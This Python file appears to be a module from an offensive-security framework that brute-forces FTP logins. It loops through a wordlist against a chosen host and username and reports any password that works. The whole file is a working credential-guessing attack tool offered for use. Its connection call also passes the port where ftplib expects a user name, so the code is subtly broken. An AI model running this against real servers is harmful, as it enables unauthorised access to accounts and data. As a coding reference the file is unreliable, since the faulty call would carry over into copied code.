import ftplib
from waf.libs.color  import *
from waf.libs import variable as var

info = {
        "name"        : "ftp",
        "title"       : "Guess the protocol password",
        "module"      : "exploits/crack/password/protocol/ftp",
        "description" : "Guess the protocol password"
}



options ={
  "RHOSTS"   : [str(var.all_var['rhosts']),'Host target'],
  "RPORTS"   : [str(var.all_var['rports']),'port target [21]'],
  "USERNAME" : [str(var.all_var['username']),'Username target'],
  "LISTPASS" : [str(var.all_var['listpass']),'Wordlist']
}

def connect(host,port, user, password):
        try:
                ftp = ftplib.FTP(host, port)
                ftp.login(user, password)
                print(green+"[+]"+default+"Login successfuly with password: "+str(password)+cl.end+'\n')
                ftp.quit()
        except Exception:
                return False

def running():
        try:
                host = var.all_var['rhosts']
                port = var.all_var['rports']
                user = var.all_var['username']
                password = var.all_var['listpass']
                read = open(password, 'r')
                for word in read:
                        word = word.strip('\n')
                        print(blue+"[*]"+default+"Testing: "+str(word))
                        connect(host,port, user, word)
        except Exception as e:
                print(red+"\n[-]"+default+"Error : "+str(e))
